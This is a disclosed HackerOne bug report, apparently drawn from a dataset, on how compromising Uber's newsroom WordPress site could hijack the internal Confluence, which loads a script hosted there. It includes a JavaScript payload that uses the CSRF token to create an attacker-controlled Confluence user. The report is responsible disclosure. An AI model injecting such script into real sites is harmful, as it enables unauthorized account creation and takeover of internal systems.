---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '136531'
original_report_id: '136531'
title: Compromising Atlassian Confluence (team.uberinternal.com) via WordPress (newsroom.uber.com)
weakness: Privilege Escalation
team_handle: uber
created_at: '2016-05-05T15:05:45.831Z'
disclosed_at: '2016-06-06T09:57:03.633Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 4
tags:
- hackerone
- privilege-escalation
---

# Compromising Atlassian Confluence (team.uberinternal.com) via WordPress (newsroom.uber.com)

## Metadata

- HackerOne Report ID: 136531
- Weakness: Privilege Escalation
- Program: uber
- Disclosed At: 2016-06-06T09:57:03.633Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

This issue has some relevance to most of my previous submissions so I thought it's clearer if I open a new ticket about it.

I understood you've intended the various *.uber.com WordPress sites to be isolated so that compromising them wouldn't impact Uber's internal network or user data. This has been the main reason why you've assessed the WP vulnerabilities as low risk. However, it looks like to me compromising the newroom.uber.com site hosted at WPEngine opens a trivial way to an attacker to compromise team.uberinternal.com too.

Many (possibly most or all) pages on the said Atlassian Confluence environment refer a script hosted on newsroom.uber.com. For example on the 404 error page:
~~~~ html
<script src="https://newsroom.uber.com/wp-content/uploads/adrum.js"></script>
~~~~
An attacker exploiting a vulnerability on *newsroom* can modify the adrum.js file. I've previously demonstrated controlling files under the webroot.

Any injected script would be evaluated for Uber employees logged on Confluence. For instance, this example script (tested on my local test Confluence) appended in adrum.js would create a new Confluence user with a password chosen by the attacker:
~~~~ javascript
(function(){
var token=AJS.Meta.get('atl-token');
var x=new XMLHttpRequest();
x.open('POST','/admin/users/docreateuser.action');
x.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
x.send('atl_token='+token+'&username=attacker&fullName=foo&email=new@attacker.com&password=new&confirm=new');
})();
~~~~
User management in Confluence has an additional security measure: an admin password is asked before allowing the operation. However, the injected script would attempt to create the user on every pageload, and if an administrator enters the user management legitimately any time, the request succeeds.

Of course, this is merely one simple example of what the injected script could do.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
